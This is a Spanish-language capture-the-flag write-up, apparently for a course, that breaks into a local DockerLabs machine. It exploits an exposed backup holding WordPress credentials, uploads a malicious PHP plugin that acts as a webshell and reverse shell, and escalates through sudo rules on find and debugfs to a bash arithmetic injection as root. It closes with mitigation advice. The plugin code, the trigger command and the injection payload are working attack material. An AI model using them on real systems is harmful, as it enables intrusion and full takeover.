# Reporte de Explotación | Writeup: Exfiltración de Credenciales, RCE en WordPress y Escalada de Privilegios Lateral y Vertical.

El presente documento detalla el proceso de analisis de vulnerabilidades y pruebas de penetracion (*Pentesting*) realizado sobre la maquina , un entorno controlado desplegado localmente mediante la plataforma **DockerLabs**. 

El objetivo es identificar servicios expuestos, explotar fallos de configuracion o vulnerabilidades de software, y escalar privilegios hasta obtener acceso total como el usuario administrador (`root`).

* **Curso:** [Ciberseguridad BIOS]
* **Auditoria:** [NGalarza-sysec]
* **Objetivo de Evaluación:** Máquina Whoiam (IP: `172.18.0.2`)

> [!IMPORTANT]
> **Vulnerabilidades Explotadas:**
> 
> 1. **Exfiltración de Credenciales:** Exposición de archivos de respaldo comprimidos (`databaseback2may.zip`) en directorio web público (`/backups`).
> 2. **Ejecución Remota de Comandos (RCE):** Despliegue de un *Plugin* malicioso en PHP actuando como *Webshell* y *Reverse Shell* en WordPress.
> 3. **Escalada de Privilegios Horizontal (Sudo Abuse):** Malconfiguración en regla `sudoers` para ejecución del binario `/usr/bin/find` sin contraseña (`www-data` -> `rafa`).
> 4. **Escalada de Privilegios Horizontal (Sudo Abuse):** Malconfiguración en regla `sudoers` para ejecución del binario interactivo `/usr/sbin/debugfs` sin contraseña (`rafa` -> `ruben`).
> 5. **Escalada de Privilegios Vertical (Inyección Bash Arithmetic):** Inyección de comandos en el script `/opt/penguin.sh` ejecutado mediante `sudo` como `root` (`ruben` -> `root`).

> [!IMPORTANT]
> **Índice de Contenidos**
> 
> 1. [Reconocimiento y Enumeración Inicial](#sec1)
> 2. [Inspección del Servicio Web](#sec2)
> 3. [Análisis de Vulnerabilidad en Plugin](#sec3)
> 4. [Explotación y Acceso Inicial](#sec4)
> 5. [Fase de Explotación](#sec5)
> - 5.6 [Tratamiento y Estabilización de la Terminal (TTY Stabilization)](#sec5.6)
> 6. [Escalación de Privilegios](#sec6)
> 7. [Resumen de la Cadena Completa](#sec7) 
> 8. [Recomendaciones de Hardening (Mitigación)](#sec8)


<a name="sec1"></a>
## 1. Escaneo de Puerto. (Nmap)
>[!NOTE] 
>**🎯  Objetivo**
>
>**Identificar Puertos abiertos Ejecutando Nmap 172.18.0.2**
>
>```bash
>nmap 172.18.0.2
>```
>![](Imagenes/IMG-1.png)
>
>**✅  Resultado**
>
> El análisis determinó que el siguiente puerto se encuentra accesible:
>
>* **Port 80/tcp:** Servicio HTTP abierto (Servidor Web).

<a name="sec2"></a>
## 2.  Inspección del Servicio Web. Reconocimiento HTTP 
>[!NOTE] 
>**🎯  Objetivo**
>
> Interactuar con el servicio HTTP expuesto en el puerto 80 para auditar el contenido de la página web principal.
>
>Al navegar a la dirección `http://172.18.0.2`, se observa una landing page estática con el título *"Whoiam: I don't know who I am, I have to find out."* y un botón de interacción (*About us*). No se aprecian formularios ni parámetros visibles a simple vista.
>
>![](Imagenes/IMG-2.png)

<a name="sec3"></a>
## 3. Descubrimiento de Rutas (Fuzzing con Gobuster)
>[!NOTE]
> **🎯  Objetivo**
>
>Ejecutar un proceso de *fuzzing web* automatizado para mapear la estructura interna del sitio e identificar directorios ocultos o archivos expuestos.
>
>Se realiza una búsqueda dirigida utilizando un diccionario estándar y especificando extensiones comunes de ejecución y compresión:
>
>```bash 
>gobuster dir -u http://172.18.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,sh,html,py,zip,rar
>```
>![](Imagenes/IMG-3.png)
>
>### Análisis de las Respuestas del Servidor
>
>**El escaneo por fuerza bruta reportó las siguientes rutas de interés crítico:**
>
>* `/wp-content/` (Status: 301) -> **Confirma el uso del CMS WordPress.**
>* `/wp-login.php` (Status: 200) -> **Panel de inicio de sesión administrativo.** 
>* `/backups/` (Status: 301) -> **Directorio de almacenamiento expuesto.**
>* `readme.html` (Status: 200) -> **Archivo de documentación por defecto de WordPress.**

<a name="sec4"></a>
## 4. Plan de Acción y Rutas de Explotación
>[!NOTE]
>**A partir del reconocimiento previo, se trazan tres vectores potenciales de ataque:**
> 
> **Ruta 1: Auditoría del Directorio `/backups`**
> 
> Se inspeccionará de forma manual el directorio web expuesto para comprobar si almacena copias de seguridad de la base de datos (`.sql`), credenciales en texto plano o configuraciones sensibles.
> 
> * **URL:** `http://172.18.0.2/backups/`

>[!WARNING]
> **Ruta 2: Reconocimiento y Fuerza Bruta con WPScan**
> 
> Al confirmarse la existencia de WordPress, se plantea una enumeración agresiva de usuarios y complementos vulnerables utilizando la suite WPScan.
> 
> * *Enumeración de usuarios:* `wpscan --url http://172.18.0.2 --enumerate u`
> * *Fuerza bruta al panel administrativo:* `wpscan --url http://172.18.0.2 -U <usuario> -P /usr/share/wordlists/rockyou.txt`

>[!NOTE]
> **Ruta 3: Inspección de Metadatos en `readme.html`**
> 
> Revisión del archivo de texto expuesto para extraer la versión exacta del CMS y contrastar vulnerabilidades públicas asociadas en bases de datos como *Searchsploit*.

<a name="sec5"></a>
## 5. Fase de Explotación
>[!NOTE]
>### 5.1 Explotación de la Ruta 1: Análisis del Respaldo Web
>
>Al acceder de manera directa al directorio `/backups/` desde el navegador, se constató que el indexado de archivos web se encuentra activo, exponiendo un paquete comprimido llamado `databaseback2may.zip`.
>
>![](Imagenes/IMG-4.png)
>
>### Descarga y Descompresión
>
>Se transfiere el archivo hacia el equipo atacante y se extraen sus elementos:
>
>```bash
>
>wget http://172.18.0/backups/databaseback2may.zip
>
>unzip databaseback2may.zip
>```
>
>### Inspección del Archivo Extraído
>
>La descompresión generó un archivo plano de nombre `29DBMay`. Al examinar su contenido, se localizaron credenciales de acceso administrativo expuestas en texto plano:
>
>```bash
>cat 29DBMay
>```
>
>* **Username:** `developer`
> 
>* **Password:** `2wmy3KrGDRD%RsA7Ty5n71L^`
>
>![](Imagenes/IMG-5.png)

>[!NOTE]
>
>### 5.2 Autenticación y Acceso al Panel de Administración (WordPress)
>
>Las credenciales obtenidas se validaron en el formulario `/wp-login.php`, logrando un inicio de sesión exitoso y acceso total al *Dashboard* (`/wp-admin/`) bajo el contexto del usuario `developer`.
>
>**Información recolectada del entorno:**
>
>* **Versión del CMS:** **`WordPress 6.5.4`**
>  
>* **Tema Activo:** **`Twenty Twenty-Four`**
>  
>* **Plugins Instalados:** **`Modern Events Calendar (M.E. Calendar)`**
>  
>![](Imagenes/IMG-6.png)
>
>![](Imagenes/IMG-7.png)
>
>![](Imagenes/IMG-8.png)

>[!NOTE]
>### 5.3 Creación y Configuración de un Complemento Malicioso (RCE)
>
>Para consolidar la Ejecución Remota de Comandos (RCE) y forzar una conexión inversa, se estructuró un plugin personalizado en PHP que funciona como disparador de una *Reverse Shell*:
>
>`plugin-shell.php`
>
>```php
><?php
>/*
>Plugin Name: CTF Shell
>Description: Shell for the CTF lab.
>Version: 1.0
>*/
>$cmd = 'cmd';
>if (isset($_REQUEST[$cmd])) {
>    system($_REQUEST[$cmd]);
>} elseif (isset($_REQUEST['ip'])) {
>   $ip = $_REQUEST['ip'];
>    $port = isset($_REQUEST['port']) ? (int)$_REQUEST['port'] : 4444;
>    
>    if (!filter_var($ip, FILTER_VALIDATE_IP)) { die("Invalid IP"); }
>    if ($port < 1 || $port > 65535) { die("Invalid port"); }
>    
>    $sock = fsockopen($ip, $port, $errno, $errstr, 5);
>    if (!$sock) { die("Connection failed: $errstr ($errno)"); }
>    
>    $descriptors = [0 => $sock, 1 => $sock, 2 => $sock];
>    $process = proc_open('/bin/bash -i', $descriptors, $pipes);
>    if (is_resource($process)) { proc_close($process); }
>    fclose($sock);
>}
>?>
>```

>[!NOTE]
>### 5.4 Empaquetado y Despliegue en WordPress
>Dado que la plataforma restringe las subidas a archivos comprimidos, se empaqueta el script y se realiza la carga web:
>
>```bash
>zip ctf-shell.zip plugin-shell.php
>```
>* **1.** Dentro del panel, se navega a **Plugins** -> **Add New** -> **Upload Plugin**.
>* **2.** Se sube el archivo `ctf-shell.zip` y se confirma su activación.
>* **3.** El archivo queda alojado e indexado en la ruta interna: `/wp-content/plugins/ctf-shell/plugin-shell.php`.
>
>![](Imagenes/IMG-9.png)
>
>![](Imagenes/IMG-10.png)
>
>![](Imagenes/IMG-11.png)

>[!NOTE]
>### 5.5 Estabilización del Listener y Disparo del Payload
>**Se prepara un receptor netcat en la máquina local para interceptar la conexión entrante:**
>
>```bash
>nc -lvnp 4444
>```
>
>![](Imagenes/IMG-12.png)
>
>**Posteriormente, se invoca de forma remota el complemento malicioso usando `curl`, codificando la IP y el puerto del atacante como parámetros de la solicitud HTTP:**
>
>```bash
>curl -v --get \
> --data-urlencode "ip=172.18.0.1" \
> --data-urlencode "port=4444" \
> "http://172.18.0.2/wp-content/plugins/ctf-shell/plugin-shell.php"
>```
>
>![](Imagenes/IMG-13.png)
>
>**El servidor web procesa el script de manera indefinida, lo que confirma que el subproceso interactivo de `/bin/bash` se ha enlazado con éxito hacia nuestra consola.**

<a name="sec5.6"></a>
>[!NOTE]
>
>### 5.6 Tratamiento y Estabilización de la Terminal (TTY Stabilization)
>Para evitar la pérdida accidental de la sesión y habilitar funciones nativas (autocompletado, colores, combinaciones de teclas e historial), se ejecuta la técnica estándar de estabilización TTY:
>
>```bash
># 1. Generar una pseudo-terminal (PTY) interactiva
>script /dev/null -c bash
>
># 2. Suspender temporalmente la shell hacia el segundo plano
>Ctrl + Z
>
># 3. Configurar el modo raw local y restaurar al primer plano
>stty raw -echo; fg
>
># 4. Presionar la tecla ENTER para limpiar la pantalla y actualizar variables
>export TERM=xterm
>export SHELL=bash
># 5. Abre otra pestaña o terminal en tu Kali local y ejecuta:
>stty size
>Esto te devolverá dos números, por ejemplo: 75 155 (el primero son las filas y el segundo las columnas).
>Vuelve a tu shell del laboratorio (la reversa) y dile al sistema cuáles son esas dimensiones exactas ejecutando:
>stty rows 75 cols 155 (Reemplaza el 75 y el 155 por los números reales que te dio tu máquina).
>```
>
>![](Imagenes/IMG-14.png)
>
>Con este paso completado, se valida el nivel de acceso inicial obtenido en el sistema:
>* **Usuario:** `www-data` (Cuenta de servicio web restringida).

<a name="sec6"></a>
## 6. Escalación de Privilegios
>[!NOTE]
>### 6.1 Identificación de Permisos Elevados (`sudo -l`)
>
>Se ejecuta una auditoría local sobre las directivas de privilegios delegadas al usuario actual `www-data`:
>```bash
>sudo -l
>```
>
>### Resultado del Análisis
>Se detectó la siguiente regla explícita en el archivo sudoers:
>```text
>(rafa) NOPASSWD: /usr/bin/find
>```
>Esto significa que `www-data` tiene autorización para invocar el binario `/usr/bin/find` simulando la identidad del usuario `rafa` sin requerir credenciales.

>[!NOTE]
>### 6.2 Escalación Horizontal 1 (`www-data` -> `rafa`)
>Utilizando los parámetros del binario `find`, se inyecta un escape para ejecutar código del sistema operativo bajo el nuevo contexto de usuario.
>
>`La técnica de evasión y la estructura del parámetro de ejecución se obtuvieron a partir de la documentación pública de **GTFOBins (find)**.`
>```bash
>sudo -u rafa /usr/bin/find . -exec /bin/bash \; -quit
>```
>Al verificar la identidad actual con `whoami`, la consola devuelve el valor: `rafa`.
>
>![](Imagenes/IMG-15.png)

>[!NOTE]
>### 6.3 Escalación Horizontal 2 (`rafa` -> `ruben`)
>Establecidos en el contexto de `rafa`, se vuelven a examinar las delegaciones de comandos `sudo -l`:
>```text
>(ruben) NOPASSWD: /usr/sbin/debugfs
>```
>Se detecta un vector de escalación horizontal hacia la cuenta del usuario `ruben` mediante la herramienta interactiva de depuración de sistemas de archivos `debugfs`.
>
>### Vector de Explotación (`debugfs`)
>El binario interactivo `debugfs` permite mandar comandos directos a la shell subyacente anteponiendo un signo de exclamación (`!`)
>
>`Al igual que en el vector anterior, el método de escape interactivo para este binario se extrajo de la base de conocimientos de **GTFOBins (debugfs)**.`
>```bash
># 1. Iniciar debugfs delegando los permisos hacia el objetivo ruben
>sudo -u ruben /usr/sbin/debugfs
>
># 2. Escapar a una shell interactiva dentro del prompt interno
>debugfs: !/bin/bash
>```
>Al realizar la validación del entorno, se confirma la transición existosa al usuario `ruben`.
>
>![](Imagenes/IMG-16.png)

>[!NOTE]
>### 6.4 Enumeración y Escalación Vertical (`ruben` -> `root`)
>Por tercera vez, se listan los privilegios delegados mediante `sudo -l` en la sesión activa:
>
>```text
>(ALL) NOPASSWD: /bin/bash /opt/penguin.sh
>```
>El usuario tiene permitido ejecutar el script `/opt/penguin.sh` llamando al intérprete de Bash con los privilegios de cualquier usuario del sistema (incluido `root`).
>
>### Análisis de Código en `/opt/penguin.sh`
>Al revisar la estructura del archivo mediante `cat`, se observa la siguiente lógica condicional:
>
>```bash
>#!/bin/bash
>read -rp "Enter guess: " num
>if [[ $num -eq 42 ]]
>then
> echo "Correct"
>else
> echo "Wrong"
>fi
>```
>
>### Vector Vulnerable: Inyección de Evaluación Aritmética en Bash
>En intérpretes Bash, las sentencias de evaluación matemática encerradas en dobles corchetes `[[ $var -eq ... ]]` interpretan y ejecutan expresiones complejas y sustituciones de comandos antes de comprobar la equivalencia >numérica. Debido a que la variable `$num` tomada del usuario no es filtrada ni sanitizada, un atacante puede inyectar código arbitrario para forzar una ejecución delegada con los permisos del superusuario.
>
>### Evidencia Final de Escalación
>Invocamos el comando y suministramos un *payload* de inyección aritmética diseñado para instanciar una sub-shell de Bash:
>
>```bash
>sudo /bin/bash /opt/penguin.sh
>```
>* **Payload introducido al solicitar la entrada:** `a[$(/bin/bash >&2)]+42`
>
>La inyección se ejecuta inmediatamente en el backend antes de validar el bloque lógico, rompiendo el flujo del script y otorgando una sesión interactiva como el usuario administrador máximo:
>```text
>root@c3ae684fee10:# whoami
>root
>```
>![](Imagenes/IMG-17.png)

<a name="sec7"></a>
## 7. Resumen de la Cadena Completa

| Fase                       | Contexto Inicial  | Vector / Herramienta              | Contexto Obtenido |
| :------------------------- | :---------------- | :-------------------------------- | :---------------- |
| 1. Acceso Inicial          | `Unauthenticated` | RCE en Plugin WP                  | `www-data`        |
| 2. Escalación Horizontal 1 | `www-data`        | `sudo -u rafa /usr/bin/find`      | `rafa`            |
| 3. Escalación Horizontal 2 | `rafa`            | `sudo -u ruben /usr/sbin/debugfs` | `ruben`           |
| 4. Escalación Vertical     | `ruben`           | Inyección en `/opt/penguin.sh`    | **`root`**        |

<a name="sec8"></a>
## 8.Recomendaciones de Hardening (Mitigación)
>[!WARNING]
>1. **Sanitización de Scripts en Bash:** Modificar el script `/opt/penguin.sh` implementando una validación estricta por expresiones regulares para asegurar que el contenido sea netamente numérico antes de su evaluación:
>  ```bash
>   if [[ "$num" =~ ^[0-9]+$ ]] && [[ "$num" -eq 42 ]]; then
>       echo "Correct"
>   fi
>   ```
>2. **Principio de Menor Privilegio (Sudoers):** Retirar las reglas `NOPASSWD` de los binarios interactivos (`find` y `debugfs`). Evitar delegar accesos de superusuario a scripts que interactúen directamente con entradas suministradas por los usuarios.
>
>3. **Seguridad en WordPress y Sistema de Archivos:** Activar la directiva `define('DISALLOW_FILE_MODS', true);` en el archivo `wp-config.php` para bloquear la carga arbitraria de plugins desde la web. Adicionalmente, eliminar de forma estricta respaldos antiguos (`.zip`, `.sql`) expuestos en la raíz del servidor web.
